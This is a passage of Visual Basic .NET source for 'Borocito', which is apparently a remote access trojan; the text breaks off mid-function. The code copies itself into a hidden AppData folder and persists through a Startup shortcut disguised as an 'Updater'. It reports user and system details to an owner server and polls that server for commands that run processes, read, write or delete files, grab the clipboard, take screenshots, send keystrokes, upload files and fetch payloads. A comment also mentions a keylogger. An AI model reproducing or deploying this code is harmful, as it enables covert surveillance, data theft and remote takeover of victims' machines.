Imports System.IO
Imports System.Net
Imports System.Runtime.InteropServices
Imports System.Text
Imports System.Threading
Imports Microsoft.Win32
Module GlobalUses
    Public parameters As String
    Public DIRCommons As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Microsoft\Borocito"
    Public DIRTemp As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Temp"
    Public HttpOwnerServer As String
    Public compileVersion As String = My.Application.Info.Version.ToString &
        " (" & Application.ProductVersion & ") " &
        "[17/05/2022 00:11]" 'Indicacion exacta de la ultima compilacion
End Module '<--- ACTUALIZAR DATOS
Module Utility
    Public tlmContent As String
    Function AddToLog(ByVal from As String, ByVal content As String, Optional ByVal flag As Boolean = False) As String
        Try
            Dim OverWrite As Boolean = False
            If My.Computer.FileSystem.FileExists(DIRCommons & "\Borocito.log") Then
                OverWrite = True
            End If
            Dim finalContent As String = Nothing
            If flag = True Then
                finalContent = " [!!!]"
            End If
            Dim Message As String = DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy") & finalContent & " [" & from & "] " & content
            tlmContent = tlmContent & Message & vbCrLf
            Console.WriteLine("[" & from & "]" & finalContent & " " & content)
            Try
                My.Computer.FileSystem.WriteAllText(DIRCommons & "\Borocito.log", vbCrLf & Message, OverWrite)
            Catch
            End Try
            Return finalContent & "[" & from & "]" & content
        Catch ex As Exception
            Console.WriteLine("[AddToLog@Utility]Error: " & ex.Message)
            Return "[AddToLog@Utility]Error: " & ex.Message
        End Try
    End Function
    Function CreateRandomString(ByRef Length As Integer) As String
        Dim str As String = Nothing
        Dim rnd As New Random
        For i As Integer = 0 To Length
            Dim chrInt As Integer = 0
            Do
                chrInt = rnd.Next(30, 122)
                If (chrInt >= 48 And chrInt <= 57) Or (chrInt >= 65 And chrInt <= 90) Or (chrInt >= 97 And chrInt <= 122) Then
                    Exit Do
                End If
            Loop
            str &= Chr(chrInt)
        Next
        Return str
    End Function
    <DllImport("kernel32")>
    Private Function GetPrivateProfileString(ByVal section As String, ByVal key As String, ByVal def As String, ByVal retVal As StringBuilder, ByVal size As Integer, ByVal filePath As String) As Integer
        'Use GetIniValue("KEY_HERE", "SubKEY_HERE", "filepath")
    End Function
    Public Function GetIniValue(section As String, key As String, filename As String, Optional defaultValue As String = Nothing) As String
        Dim sb As New StringBuilder(500)
        If GetPrivateProfileString(section, key, defaultValue, sb, sb.Capacity, filename) > 0 Then
            Return sb.ToString
        Else
            Return defaultValue
        End If
    End Function
End Module
Module Memory
    Public regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito", True)
    Public OwnerServer As String
    Public UID As String
    Public MyCommandProcessor As String
    Sub SaveRegedit()
        Try
            AddToLog("SaveRegedit@Memory", "Saving data...", False)
            regKey.SetValue("UID", UID, RegistryValueKind.String)
            regKey.SetValue("MyCommandProcessor", MyCommandProcessor, RegistryValueKind.String)
            LoadRegedit()
        Catch ex As Exception
            AddToLog("SaveRegedit@Memory", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub LoadRegedit()
        Try
            AddToLog("LoadRegedit@Memory", "Loading data...", False)
            OwnerServer = regKey.GetValue("OwnerServer")
            UID = regKey.GetValue("UID")
            MyCommandProcessor = regKey.GetValue("MyCommandProcessor")
            HttpOwnerServer = "http://" & OwnerServer
        Catch ex As Exception
            AddToLog("LoadRegedit@Memory", "Error: " & ex.Message, True)
        End Try
    End Sub
End Module
Module StartUp
    Sub Init()
        AddToLog("Init", "Borocito " & My.Application.Info.Version.ToString & " (" & Application.ProductVersion & ")" & " has started! " & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy"), True)
        Try
            Threading.Thread.Sleep(1500)
            'Iniciar desde otra ubicacion
            RunFromLocation()
            'Evita multi-instancias
            OnlyOneInstance()
            'Iniciar con Windows
            StartWithWindows()
            'Iniciar con Administrador
            StartWithAdmin()
            'Ver si ha existido
            If AlreadyExist() Then
                'Ya ha existido
                LoadRegedit()
                'Actualizaciones de telemtria
                StartRefreshTelemetry(True)
                'Lee los archivos de configuracion del servidor
                ServerConfigFiles()
                'iniciar todo lo demas.
                '   Escuchar comandos desde el servidor
                CommandListenerManager(True)
                '   Escuchar configuracion de UID
                ConfigFileListenerManager(True)
            Else
                'No ha existido
                'Crear UID
                UID = CreateRandomString(15)
                'Guarda la UID
                SaveRegedit()
                'Reportar al servidor
                ReportMeToServer()
                'Guardar existencia
                SetExistence()
                'Reiniciar
                RestartBorocito()
            End If
        Catch ex As Exception
            AddToLog("Init@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub OnlyOneInstance()
        Try
            AddToLog("OnlyOneInstance@StartUp", "Checking instances...", True)
            Dim p = Process.GetProcessesByName(IO.Path.GetFileNameWithoutExtension(Application.ExecutablePath))
            If p.Count > 1 Then
                AddToLog("OnlyOneInstance@StartUp", "Instance detected!, closing me...", True)
                End
            Else
                AddToLog("OnlyOneInstance@StartUp", "No instances detected!, starting...", True)
            End If
        Catch ex As Exception
            AddToLog("OnlyOneInstance@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub RunFromLocation()
        Try
            If Application.StartupPath.Contains("Local\Microsoft") = False Then
                AddToLog("RunFromLocation@StartUp", "Running from " & Application.ExecutablePath, True)
                If My.Computer.FileSystem.FileExists(DIRCommons & "\Borocito.exe") Then
                    My.Computer.FileSystem.DeleteFile(DIRCommons & "\Borocito.exe")
                End If
                My.Computer.FileSystem.CopyFile(Application.ExecutablePath, DIRCommons & "\Borocito.exe")
                Process.Start(DIRCommons & "\Borocito.exe", parameters)
                End
            End If
        Catch ex As Exception
            AddToLog("RunFromLocation@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
    Function AlreadyExist() As Boolean
        AddToLog("AlreadyExist@StartUp", "Checking if exist", False)
        Try
            If regKey Is Nothing Then
                AddToLog("AlreadyExist@StartUp", "I dont exist.", False)
                Return False
            Else
                If regKey.GetValue("UID") = Nothing Then
                    AddToLog("AlreadyExist@StartUp", "I exist, but badly borned.", False)
                    Return False
                Else
                    AddToLog("AlreadyExist@StartUp", "Already exist. Im here!", False)
                    Return True
                End If
                Return False
            End If
        Catch ex As Exception
            AddToLog("AlreadyExist@StartUp", "Error: " & ex.Message, True)
            Return False
        End Try
    End Function
    Sub RestartBorocito()
        Try
            AddToLog("RestartBorocito@StartUp", "Restarting...", False)
            SendFirstTelemetry()
            Process.Start(Application.ExecutablePath)
            End
        Catch ex As Exception
            AddToLog("RestartBorocito@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub SetExistence()
        Try
            AddToLog("SetExistence@StartUp", "Setting the existente in the Windows Registry", False)
            Registry.CurrentUser.CreateSubKey("SOFTWARE\\Borocito")
            regKey.SetValue("UID", UID, RegistryValueKind.String)
        Catch ex As Exception
            AddToLog("SetExistence@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub StartWithWindows()
        Try
            AddToLog("StartWithWindows@StartUp", "Making Borocito start with Windows...", False)
            'If My.Computer.FileSystem.FileExists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.exe") Then
            '    My.Computer.FileSystem.DeleteFile(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.exe")
            'End If
            'My.Computer.FileSystem.CopyFile(DIRCommons & "\BorocitoUpdater.exe", Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.exe")
            'If My.Computer.FileSystem.FileExists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.bat") = False Then
            '    Dim CMDContent As String = "@echo off" &
            '    vbCrLf & "title Borocito CLI" &
            '    vbCrLf & "cd " & """" & DIRCommons & """" &
            '    vbCrLf & "start " & "BorocitoUpdater.exe" &
            '    vbCrLf & "exit"
            '    My.Computer.FileSystem.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.bat", CMDContent, False, System.Text.Encoding.ASCII)
            'End If
            Dim StartupShortcut As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.lnk"
            If My.Computer.FileSystem.FileExists(StartupShortcut) = False Then
                Dim WSHShell As Object = CreateObject("WScript.Shell")
                Dim Shortcut As Object = WSHShell.CreateShortcut(StartupShortcut)
                Shortcut.IconLocation = DIRCommons & "\BorocitoUpdater.exe,0"
                Shortcut.TargetPath = DIRCommons & "\BorocitoUpdater.exe"
                'Shortcut.Arguments = " /StartBorocito"
                Shortcut.WindowStyle = 1
                Shortcut.Description = "Updater software for Borocito"
                Shortcut.Save()
                My.Computer.FileSystem.CopyFile(DIRCommons & "\BorocitoUpdater.exe", Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.exe")
            End If
        Catch ex As Exception
            AddToLog("StartWithWindows@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub StartWithAdmin()
        Try

        Catch ex As Exception
            AddToLog("StartWithAdmin@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
End Module
Module Network
    Dim refreshTelemetryThread As Thread = New Thread(New ThreadStart(AddressOf SendRefreshTelemetry))
    Dim IsrefreshTelemetryThreadRunning As Boolean = False
    Dim IsCommandReaderThreadRunning As Boolean = False
    Dim IsConfigReaderThreadRunning As Boolean = False
    Dim PersistentProccessed As Boolean = False
    Dim PersistentCommand As String = Nothing
    Dim cmdSetType As SByte = 0
    Dim ThreadReadCMDServer As Threading.Thread = New Thread(New ThreadStart(AddressOf ReadCommandFile))
    Dim ThreadReadGeneralConfigServer As Threading.Thread = New Thread(New ThreadStart(AddressOf ReadConfigFile))
    Sub ReportMeToServer()
        Try
            Dim reportContent As String = "#New User Report " & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy") & " Version: " & My.Application.Info.Version.ToString & " (" & Application.ProductVersion & ")" &
                vbCrLf & "[User]" &
                vbCrLf & "Status=" & "True" &
                vbCrLf & "Name=" & Environment.UserName &
                vbCrLf & "UID=" & UID &
                vbCrLf & "PC=" & Environment.UserDomainName &
                vbCrLf & "InternalIP=" & "" &
                vbCrLf & "Language=" & My.Computer.Info.InstalledUICulture.NativeName &
                vbCrLf & "Account=" & My.User.Name &
                vbCrLf & "[PC]" &
                vbCrLf & "OS=" & My.Computer.Info.OSFullName & " " & My.Computer.Info.OSVersion &
                vbCrLf & "RAM=" & My.Computer.Info.TotalPhysicalMemory &
                vbCrLf & "Screen=" & My.Computer.Screen.Bounds.ToString & " | (Working area: " & My.Computer.Screen.WorkingArea.ToString & ")" &
                vbCrLf & vbCrLf & vbCrLf
            Dim tlmReviewed As String = reportContent
            If tlmReviewed.Contains("&") Then
                tlmReviewed = tlmReviewed.Replace("&", "(AndSymb)")
            End If
            Dim request As WebRequest = WebRequest.Create(HttpOwnerServer & "/userReport.php")
            request.Method = "POST"
            Dim postData As String = "ident=" & UID & "&log=" & tlmReviewed
            Dim byteArray As Byte() = Encoding.UTF8.GetBytes(postData)
            request.ContentType = "application/x-www-form-urlencoded"
            request.ContentLength = byteArray.Length
            Dim dataStream As Stream = request.GetRequestStream()
            dataStream.Write(byteArray, 0, byteArray.Length)
            dataStream.Close()
            Dim response As WebResponse = request.GetResponse()
            AddToLog("ReportMeToServer@Network", "Response: " & CType(response, HttpWebResponse).StatusDescription, False)
            'If CType(response, HttpWebResponse).StatusDescription = "OK" Then
            'End If
            response.Close()
        Catch ex As Exception
            AddToLog("ReportMeToServer(CreateUser)@Network", "Error: " & ex.Message, True)
            Uninstall()
        End Try
        Try
            'Create CMD file on server
            Dim request As WebRequest = WebRequest.Create(HttpOwnerServer & "/Users/Commands/cliResponse.php")
            request.Method = "POST"
            Dim postData As String = "ident=" & UID & "&text=" & "#Command Channel for Unique User. CMD Created (" & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy") & ")" &
                vbCrLf & "Command1>" &
                vbCrLf & "Command2>" &
                vbCrLf & "Command3>" &
                vbCrLf & "[Response]" &
                vbCrLf
            Dim byteArray As Byte() = Encoding.UTF8.GetBytes(postData)
            request.ContentType = "application/x-www-form-urlencoded"
            request.ContentLength = byteArray.Length
            Dim dataStream As Stream = request.GetRequestStream()
            dataStream.Write(byteArray, 0, byteArray.Length)
            dataStream.Close()
            Dim response As WebResponse = request.GetResponse()
            AddToLog("CreateCMDFile@Network", "Response: " & CType(response, HttpWebResponse).StatusDescription, False)
            'If CType(response, HttpWebResponse).StatusDescription = "OK" Then
            'End If
            response.Close()
        Catch ex As Exception
            AddToLog("ReportMeToServer(CreateCMD)@Network", "Error: " & ex.Message, True)
            Uninstall()
        End Try
    End Sub
    Sub SendFirstTelemetry()
        Try
            AddToLog("Network", "Sending first telemetry...", False)
            Dim reportContent As String = tlmContent
            Dim request As WebRequest = WebRequest.Create(HttpOwnerServer & "/telemetryPost.php")
            request.Method = "POST"
            Dim postData As String = "ident=" & UID & "&log=" & reportContent
            Dim byteArray As Byte() = Encoding.UTF8.GetBytes(postData)
            request.ContentType = "application/x-www-form-urlencoded"
            request.ContentLength = byteArray.Length
            Dim dataStream As Stream = request.GetRequestStream()
            dataStream.Write(byteArray, 0, byteArray.Length)
            dataStream.Close()
            Dim response As WebResponse = request.GetResponse()
            AddToLog("SendTelemetry@Network", "Response: " & CType(response, HttpWebResponse).StatusDescription, False)
            'If CType(response, HttpWebResponse).StatusDescription = "OK" Then
            'End If
            response.Close()
            tlmContent = Nothing
        Catch ex As Exception
            AddToLog("SendTelemetry@Network", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub SendTelemetry()
        Try
            AddToLog("Network", "Sending telemetry...", False)
            Dim reportContent As String = tlmContent
            Dim request As WebRequest = WebRequest.Create(HttpOwnerServer & "/Telemetry/tlmRefresh.php")
            request.Method = "POST"
            Dim postData As String = "ident=" & UID & "&log=" & reportContent
            Dim byteArray As Byte() = Encoding.UTF8.GetBytes(postData)
            request.ContentType = "application/x-www-form-urlencoded"
            request.ContentLength = byteArray.Length
            Dim dataStream As Stream = request.GetRequestStream()
            dataStream.Write(byteArray, 0, byteArray.Length)
            dataStream.Close()
            Dim response As WebResponse = request.GetResponse()
            AddToLog("SendTelemetry@Network", "Response: " & CType(response, HttpWebResponse).StatusDescription, False)
            response.Close()
            tlmContent = Nothing
        Catch ex As Exception
            AddToLog("SendTelemetry@Network", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub SendCustomTelemetryFile(ByVal filePath As String, Optional ByVal serverPost As String = Nothing)
        Try
            AddToLog("SendCustomTelemetryFile@Network", "Sending file to telemetry...", False)
            If serverPost = Nothing Then
                My.Computer.Network.UploadFile(filePath, HttpOwnerServer & "/fileUpload.php")
            Else
                My.Computer.Network.UploadFile(filePath, serverPost)
            End If
            AddToLog("SendCustomTelemetryFile@Network", "A file was sended as telemetry. " & filePath.Remove(0, filePath.LastIndexOf("\") + 1), False)
        Catch ex As Exception
            AddToLog("SendCustomTelemetryFile@Network", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub StartRefreshTelemetry(ByVal StartIt As Boolean)
        Try
            If StartIt Then
                'Se inicia
                If IsrefreshTelemetryThreadRunning Then
                    refreshTelemetryThread.Resume()
                Else
                    refreshTelemetryThread.Start()
                    IsrefreshTelemetryThreadRunning = True
                End If
            Else
                'Se detiene
                refreshTelemetryThread.Suspend()
            End If
        Catch ex As Exception
            AddToLog("StartRefreshTelemetry@Network", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub SendRefreshTelemetry()
        Try
            While True
                Thread.Sleep(1800000) '30 minutos
                SendTelemetry()
            End While
        Catch ex As Exception
            AddToLog("SendRefreshTelemetry@Network", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub SendCommandResponse(Optional ByVal CMDResponse As String = Nothing)
        Try
            AddToLog("SendCommandResponse@Network", "Sending: " & CMDResponse, False)
            Dim request As WebRequest = WebRequest.Create(HttpOwnerServer & "/Users/Commands/cliResponse.php")
            request.Method = "POST"
            Dim postData As String = "ident=" & UID & "&text=" & "#Command Channel for Unique User. Responded (" & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy") & ")" &
                vbCrLf & "Command1>" &
                vbCrLf & "Command2>" &
                vbCrLf & "Command3>" & PersistentCommand &
                vbCrLf & "[Response]" &
                vbCrLf & CMDResponse
            Dim byteArray As Byte() = Encoding.UTF8.GetBytes(postData)
            request.ContentType = "application/x-www-form-urlencoded"
            request.ContentLength = byteArray.Length
            Dim dataStream As Stream = request.GetRequestStream()
            dataStream.Write(byteArray, 0, byteArray.Length)
            dataStream.Close()
            Dim response As WebResponse = request.GetResponse()
            AddToLog("SendCommandResponse@Network", "Response: " & CType(response, HttpWebResponse).StatusDescription, False)
            'If CType(response, HttpWebResponse).StatusDescription = "OK" Then
            'End If
            response.Close()
        Catch ex As Exception
            AddToLog("SendCommandResponse@Network", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub CommandListenerManager(ByVal active As Boolean)
        Try
            If active Then
                'Activo
                If IsCommandReaderThreadRunning Then
                    ThreadReadCMDServer.Resume()
                Else
                    ThreadReadCMDServer.Start()
                    IsCommandReaderThreadRunning = True
                End If
            Else
                'Inactivo
                ThreadReadCMDServer.Suspend()
            End If
        Catch ex As Exception
            AddToLog("CommandListenerManager@Network", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub ConfigFileListenerManager(ByVal active As Boolean)
        Try
            'If active Then
            '    'Activo
            '    If IsConfigReaderThreadRunning Then
            '        ThreadReadGeneralConfigServer.Resume()
            '    Else
            '        ThreadReadGeneralConfigServer.Start()
            '        IsConfigReaderThreadRunning = True
            '    End If
            'Else
            '    'Inactivo
            '    ThreadReadGeneralConfigServer.Suspend()
            'End If
        Catch ex As Exception
            AddToLog("ConfigFileListenerManager@Network", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub ReadCommandFile()
        While True
            Try
                Dim LocalCommandFile As String = DIRCommons & "\[" & UID & "]Command.str"
                Dim RemoteCommandFile As String = HttpOwnerServer & "/Users/Commands/[" & UID & "]Command.str"
                Thread.Sleep(5000) '5 segundos (despues deben ser 10)
                If My.Computer.FileSystem.FileExists(LocalCommandFile) Then
                    My.Computer.FileSystem.DeleteFile(LocalCommandFile)
                End If
                My.Computer.Network.DownloadFile(RemoteCommandFile, LocalCommandFile)
                'Leer
                Dim TextBoxVR As New TextBox With {
                    .Text = My.Computer.FileSystem.ReadAllText(LocalCommandFile)
                }
                Dim Lineas = TextBoxVR.Lines
                Dim tempString As String = Nothing
                Dim CommandResponse As String = Nothing

                Dim CMD1 As String = Lineas(1).Split(">"c)(1).Trim() 'Comando principal
                Dim CMD2 As String = Lineas(2).Split(">"c)(1).Trim() 'Comando secundario
                Dim CMD3 As String = Lineas(3).Split(">"c)(1).Trim() 'Comando persistente
                Dim PersistentesCMD() As String = CMD3.Split("|")
                PersistentCommand = CMD3

                'Las respuestas generadas por cada comando deben ser concatenadas con la respuesta del anterior, luego de eso, debe ser enviada.
                '   Asi se mostrara la respuesta (separada por cada linea) de cada comando

                If CMD1 <> Nothing Then
                    CommandResponse = ProccessCommand(CMD1)
                    If CMD1 = Nothing Then
                    Else
                        If CommandResponse = Nothing Then
                            SendCommandResponse("Ejecuted " & CMD1 & " " & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy")) 'ENVIAR RESPUESTA
                        Else
                            SendCommandResponse(CommandResponse)
                        End If
                    End If
                End If

                If CMD2 <> Nothing Then
                    CommandResponse &= vbCrLf & ProccessCommand(CMD2)
                    If CMD2 = Nothing Then
                    Else
                        If CommandResponse = Nothing Then
                            SendCommandResponse("Ejecuted Secundary " & CMD2 & " " & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy")) 'ENVIAR RESPUESTA
                        Else
                            SendCommandResponse(CommandResponse)
                        End If
                    End If
                End If

                If Not PersistentProccessed Then 'Solo procesa por instancia (una vez)
                    If CMD3 <> Nothing Then
                        For Each comando As String In PersistentesCMD
                            CommandResponse &= vbCrLf & ProccessCommand(comando)
                        Next
                        If CMD3 = Nothing Then
                        Else
                            If CommandResponse = Nothing Then
                                SendCommandResponse("Ejecuted Persistent " & CMD3 & " " & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy")) 'ENVIAR RESPUESTA
                            Else
                                SendCommandResponse(CommandResponse)
                            End If
                        End If
                        PersistentProccessed = True
                    End If
                End If
            Catch ex As Exception
                AddToLog("ReadCommandFile@Network", "Error: " & ex.Message, True)
            End Try
        End While
    End Sub
    Function ProccessCommand(ByVal command As String) As String
        Try
            Dim CommandCMD As String = command
            AddToLog("ProccessCommand@Network", "Processing: " & command)
            If CommandCMD.Contains("=") Then
                CommandCMD = CommandCMD.Remove(0, CommandCMD.LastIndexOf("=") + 1)
            End If
            If CommandCMD.Contains("%username%") Then
                CommandCMD = CommandCMD.Replace("%username%", Environment.UserName)
            End If
            If command.StartsWith("MsgBox=") Then
                Dim Arg() As String = CommandCMD.Split(",")
                If My.Computer.FileSystem.FileExists(DIRTemp & "\MessageBoxBRO.vbs") Then
                    My.Computer.FileSystem.DeleteFile(DIRTemp & "\MessageBoxBRO.vbs")
                End If
                My.Computer.FileSystem.WriteAllText(DIRTemp & "\MessageBoxBRO.vbs", "a = MsgBox(" & """" & Arg(0) & """" & "," & Arg(1) & "," & """" & Arg(2) & """" & ")", False, Encoding.ASCII)
                Process.Start(DIRTemp & "\MessageBoxBRO.vbs")

            ElseIf command.StartsWith("/Pause=") Then
                SendCommandResponse("Borocito has been paused for '" & CommandCMD & "' ms")
                Threading.Thread.Sleep(CommandCMD)

            ElseIf command = "/Memory.Save()" Then
                SaveRegedit()
            ElseIf command = "/Memory.Load()" Then
                LoadRegedit()

                '<--- Windows --->
            ElseIf command.StartsWith("/Windows.Process.Start=") Then
                Dim Arg() As String = CommandCMD.Split(",")
                Return ProcessStart(Arg(0), Arg(1))

            ElseIf command.StartsWith("/Windows.Process.Stop=") Then
                Return ProcessStop(CommandCMD)

            ElseIf command.StartsWith("/Windows.Process.Get") Then
                If command.Contains("'") Then
                    Return ProcessGet(command.Split("'")(1))
                Else
                    Return ProcessGet()
                End If

            ElseIf command.StartsWith("/Windows.FileSystem.GetDirectory=") Then
                Return FileSystemGetDirectory(CommandCMD)

            ElseIf command.StartsWith("/Windows.FileSystem.GetFiles=") Then
                Return FileSystemGetFiles(CommandCMD)

            ElseIf command.StartsWith("/Windows.FileSystem.Read=") Then
                Return FileSystemRead(CommandCMD)

            ElseIf command.StartsWith("/Windows.FileSystem.Write=") Then
                Dim Arg() As String = CommandCMD.Split(",")
                Return FileSystemWrite(Arg(0), Arg(1), Arg(2))

            ElseIf command.StartsWith("/Windows.FileSystem.DirCreate=") Then
                Return FileSystemDirCreate(CommandCMD)

            ElseIf command.StartsWith("/Windows.FileSystem.Delete=") Then
                Return FileSystemDelete(CommandCMD)

            ElseIf command.StartsWith("/Windows.Clipboard.Set=") Then
                Return ClipboardSet(CommandCMD)

            ElseIf command.StartsWith("/Windows.Clipboard.Get()") Then
                Return ClipboardGet()

            ElseIf command.StartsWith("/Windows.System.GetHost()") Then
                Return SystemGetHost()

                '<--- Payloads --->
            ElseIf command.StartsWith("/Payloads.DownloadComponent=") Then 'Funciona.
                Dim Arg() As String = CommandCMD.Split(",")
                Return Payloads.DownloadComponent(Arg(0), Arg(1), Boolean.Parse(Arg(2)), Arg(3), Arg(4))

            ElseIf command.StartsWith("/Payloads.Upload.File=") Then 'Funciona.
                Dim Arg() As String = CommandCMD.Split(",")
                Return Payloads.uploadAfile(Arg(0), Arg(1))

            ElseIf command.StartsWith("/Payloads.SendTheKeys=") Then 'Funciona.
                Dim Arg() As String = CommandCMD.Split(",")
                Return Payloads.SendTheKeys(Arg(0), Arg(1))

            ElseIf command.StartsWith("/Payloads.TakeScreenshot()") Then 'Funciona.
                Return Payloads.TakeAnScreenshot()

            ElseIf command.StartsWith("/Payloads.Inputs=") Then 'Funciona.
                Return Payloads.Inputs(CommandCMD)

            ElseIf command.StartsWith("/Payloads.PostNotify=") Then 'Funciona.
                Dim Arg() As String = CommandCMD.Split(",")
                Return Payloads.PostNotify(Arg(0), Arg(1), Arg(2), Arg(3), Arg(4))

                '<--- Borocito Tools --->
            ElseIf command.StartsWith("/Stop") Then 'Funciona.
                SendCommandResponse("Borocito has been called to close")
                AddToLog("Network", "Borocito has been called to close!", True)
                SendTelemetry()
                End

            ElseIf command.StartsWith("/Restart") Then 'Funciona.
                SendCommandResponse("Borocito has been called to restart")
                AddToLog("Network", "Borocito has been called to restart!", True)
                SendTelemetry()
                Restart()
                Return "Borocito has been called to restart!"

            ElseIf command.StartsWith("/Uninstall") Then 'Funciona.
                SendCommandResponse("Borocito has been called to uninstall. Goodbye")
                AddToLog("Network", "Borocito has been called to uninstall. Goodbye!", True)
                SendTelemetry()
                Uninstall()

            ElseIf command.StartsWith("/Update") Then 'Funciona.
                SendCommandResponse("Borocito has been called to Update")
                AddToLog("Network", "Borocito has been called to Update!", True)
                SendTelemetry()
                Update()
                Return "Borocito has been called to Update!"

            ElseIf command.StartsWith("/ForceUpdate") Then 'Funciona.
                SendCommandResponse("Borocito has been called to Force the Update")
                AddToLog("Network", "Borocito has been called to Force the Update!", True)
                SendTelemetry()
                Update("/ForceUpdate")
                Return "Borocito has been called to Force the Update!"

            ElseIf command.StartsWith("/Reset") Then 'Funciona.
                SendCommandResponse("Borocito has been called to Reset")
                AddToLog("Network", "Borocito has been called to Reset!", True)
                SendTelemetry()
                Extractor()

            ElseIf command.StartsWith("/SendTelemetry") Then 'Funciona.
                Return "Sending located telemetry..."
                AddToLog("Network", "Borocito has been called to send telemetry!", True)
                SendTelemetry()

            ElseIf command.StartsWith("/Heartbeat") Then 'Funciona.
                Return "---/\--- (Pum pum...)" &
                    vbCrLf & "[VARIABLES]" &
                    vbCrLf & compileVersion &
                    vbCrLf & "DIRCommons: " & DIRCommons &
                    vbCrLf & "DIRTemp: " & DIRTemp &
                    vbCrLf & "parameters: " & parameters &
                    vbCrLf & "HttpOwnerServer: " & HttpOwnerServer &
                    vbCrLf & "OwnerServer: " & OwnerServer &
                    vbCrLf & "UID: " & UID &
                    vbCrLf & "MyCommandProcessor: " & MyCommandProcessor &
                    vbCrLf & "IsrefreshTelemetryThreadRunning: " & IsrefreshTelemetryThreadRunning &
                    vbCrLf & "IsCommandReaderThreadRunning: " & IsCommandReaderThreadRunning &
                    vbCrLf & "IsConfigReaderThreadRunning: " & IsConfigReaderThreadRunning &
                    vbCrLf & "PersistentProccessed: " & PersistentProccessed &
                    vbCrLf & "PersistentCommand: " & PersistentCommand &
                    vbCrLf & "cmdSetType: " & cmdSetType &
                    vbCrLf & "[COMPUTER]" &
                    vbCrLf & "UserDomainName: " & Environment.UserDomainName &
                    vbCrLf & "RAM: " & My.Computer.Info.AvailablePhysicalMemory & "/" &
                    My.Computer.Info.AvailableVirtualMemory & "/" &
                    My.Computer.Info.TotalPhysicalMemory & "/" &
                    My.Computer.Info.TotalVirtualMemory
                AddToLog("Network", "Hey, Im here!", True)

            ElseIf command.StartsWith("/Status") Then 'Funciona.
                Return My.Application.Info.AssemblyName & " v" & My.Application.Info.Version.ToString & " (" & Application.ProductVersion & "). Running in " & Environment.UserDomainName & "\" & Environment.UserName

            ElseIf command.StartsWith("boro-get") Then 'Funciona.
                Return BORO_GET_ADMIN(command)

            ElseIf command.ToLower = "<set cmd default" Then
                cmdSetType = 0
                Return "Default command processor changed to 'default'"
            ElseIf command.ToLower = "<set cmd cmd" Then
                cmdSetType = 1
                Return "Default command processor changed to 'Console'"
            ElseIf command.ToLower = "<set cmd process" Then
                cmdSetType = 2
                Return "Default command processor changed to 'Process'"
            ElseIf command.ToLower = "<set cmd boro-get" Then
                cmdSetType = 3
                Return "Default command processor changed to 'boro-get'"
            ElseIf command.ToLower Like "*<set cmd own*" Then
                Dim args() As String = command.Split(" ")
                MyCommandProcessor = args(3)
                cmdSetType = 4
                Return "Default command processor changed to 'own' in '" & MyCommandProcessor & "'"
            Else
                If cmdSetType = 1 Then
                    Process.Start("cmd.exe", command)
                    Return "Starting cmd under '" & command & "' argument..."
                ElseIf cmdSetType = 2 Then
                    Process.Start(command)
                    Return "Starting '" & command & "'..."
                ElseIf cmdSetType = 3 Then
                    'Se espera que el usuario escriba
                    '   broKiloger /startrecording
                    'y no
                    '   broKiloger True /startrecording
                    'True se da por True.
                    Dim args() As String = command.Split(" ")
                    Dim comandoAux As String = Nothing
                    For i As Integer = 1 To args.Count - 1
                        comandoAux &= " " & args(i)
                    Next
                    Return BORO_GET_ADMIN(args(0) & " True " & comandoAux.TrimStart())
                ElseIf cmdSetType = 4 Then
                    Return AnotherCommandProcessor(command)
                End If
            End If
        Catch ex As Exception
            AddToLog("ProccessCommand@Network", "Error: " & ex.Message, True)
            Return "[" & command & "]Error: " & ex.Message
        End Try
        Return Nothing
    End Function
    Sub ReadConfigFile()
        Try
            'Hola querido, resulta que esto todavia no esta programado porque
            'forma parte de una actualizacion que esta muy, muy, pero muy en el futuro.
            '(si aplica, puede que no lo haga)
        Catch ex As Exception
            AddToLog("ReadConfigFile@Network", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub ServerConfigFiles()
        AddToLog("ServerConfigFiles@Network", "Reading server configuration...")
        Try
            'Verificar que el fichero no exista en local
            If My.Computer.FileSystem.FileExists(DIRCommons & "\Client.ini") Then
                My.Computer.FileSystem.DeleteFile(DIRCommons & "\Client.ini")
            End If
            If My.Computer.FileSystem.FileExists(DIRCommons & "\General.ini") Then
                My.Computer.FileSystem.DeleteFile(DIRCommons & "\General.ini")
            End If
            'Descargar el fichero desde el servidor
            My.Computer.Network.DownloadFile(HttpOwnerServer & "/Client.ini", DIRCommons & "\Client.ini")
